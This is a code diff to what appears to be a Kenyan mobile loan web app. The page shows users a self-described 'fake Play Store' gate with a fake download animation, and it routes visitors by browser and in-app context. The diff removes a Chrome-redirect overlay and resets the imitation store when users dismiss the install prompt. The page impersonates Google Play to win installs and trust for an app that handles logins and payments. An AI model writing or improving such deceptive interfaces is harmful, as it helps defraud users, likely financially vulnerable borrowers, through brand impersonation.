@@ -26,16 +26,6 @@
 
         .gradient-bg { background: linear-gradient(160deg, #121212 0%, #2E7D32 100%); }
 
-        /* LOADING OVERLAY FOR CHROME INTENT */
-        #chrome-redirect-overlay {
-            position: fixed; inset: 0; background: #FFFFFF;
-            z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center;
-            opacity: 0; pointer-events: none; transition: opacity 0.2s ease;
-        }
-        #chrome-redirect-overlay.active { opacity: 1; pointer-events: all; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #E2E8F0; border-top-color: #2E7D32; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 16px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
         input {
             width: 100%;
             padding: 1.2rem 1.1rem;
@@ -113,12 +103,6 @@
     </style>
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
-
-<!-- CHROME REDIRECT OVERLAY -->
-<div id="chrome-redirect-overlay">
-    <div class="spinner"></div>
-    <p class="text-slate-800 font-bold text-lg">Opening Google Chrome...</p>
-</div>
 
 <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] font-sans">Message</div>
 
@@ -425,7 +409,6 @@ let pollTimer = null, isPolling = false, isProcessingPayment = false, currentTxn
 let fakeInterval = null;
 let deferredPrompt = null;
 let loanTimerInterval = null;
-let promptReady = false; 
 
 const format = (n) => "Ksh " + Number(n).toLocaleString();
 
@@ -483,7 +466,6 @@ function resetPayButton(){
 
 const _ua = navigator.userAgent || '';
 const _isAndroid = /Android/i.test(_ua);
-const _isIOS = /iPhone|iPad|iPod/i.test(_ua);
 const _isChrome = /Chrome\/\d+/i.test(_ua) && !/Edg|OPR|SamsungBrowser|Phoenix|Firefox|UCBrowser/i.test(_ua);
 const _isInApp = /FBAN|FBAV|Instagram|Twitter|musical_ly|BytedanceWebview|TikTok|Line|Snapchat|LinkedIn|Pinterest|WhatsApp|Telegram|GSA/i.test(_ua) || /; wv\)/i.test(_ua);
 const _isLiteBrowser = /Phoenix|UCBrowser|Opera Mini|Puffin/i.test(_ua);
@@ -497,13 +479,11 @@ const splashScreen = document.getElementById('splash-screen');
 window.addEventListener('beforeinstallprompt', (e) => { 
     e.preventDefault(); 
     deferredPrompt = e; 
-    promptReady = true; 
 });
 
 window.addEventListener('appinstalled', () => { 
     localStorage.setItem('pwa_installed', '1'); 
     clearInterval(fakeInterval); 
-    promptReady = false;
     showInstalledState(); 
 });
 
@@ -526,13 +506,28 @@ function showInstalledState(){
 function handleInstallClick() {
     if (deferredPrompt) {
         startFakeDownload();
-        setTimeout(() => { deferredPrompt.prompt(); deferredPrompt = null; }, 500);
+        deferredPrompt.prompt();
+        
+        // THIS IS THE NEW PART: Listen for the user's choice
+        deferredPrompt.userChoice.then((choiceResult) => {
+            if (choiceResult.outcome === 'dismissed') {
+                // If they cancelled, reset the fake Play Store to the "Install" button
+                showInstallState();
+            }
+            deferredPrompt = null;
+        });
     } else {
         showToast("Preparing installation... please wait.");
         setTimeout(() => {
             if (deferredPrompt) {
                 startFakeDownload();
-                setTimeout(() => { deferredPrompt.prompt(); deferredPrompt = null; }, 500);
+                deferredPrompt.prompt();
+                deferredPrompt.userChoice.then((choiceResult) => {
+                    if (choiceResult.outcome === 'dismissed') {
+                        showInstallState();
+                    }
+                    deferredPrompt = null;
+                });
             } else {
                 showToast("If the prompt doesn't appear, please reload the page.");
             }
@@ -606,7 +601,7 @@ function bootApp(){
     showScreen('screen-login');
 }
 
-// --- NEW SMART ROUTING LOGIC WITH CHROME PRIORITY ---
+// --- SMART ROUTING LOGIC ---
 if (isStandalone) {
     playStoreGate.classList.add('hide'); 
     appContent.classList.remove('hide'); 
@@ -615,16 +610,13 @@ if (isStandalone) {
     playStoreGate.classList.add('hide'); 
     showAppInline();
 } else if (_isInApp || _isLiteBrowser) {
-    // IN-APP or LITE BROWSER: Skip Play Store completely and go to Form
     playStoreGate.classList.add('hide'); 
     appContent.classList.remove('hide'); 
     showScreen('screen-login');
 } else if (_isChrome) {
-    // TRUE CHROME ONLY: Show the Play Store
     playStoreGate.classList.remove('hide'); 
     showInstallState();
 } else {
-    // OTHER NORMAL BROWSERS (Safari, Samsung, etc)
     playStoreGate.classList.remove('hide'); 
     showInstallState();
 }
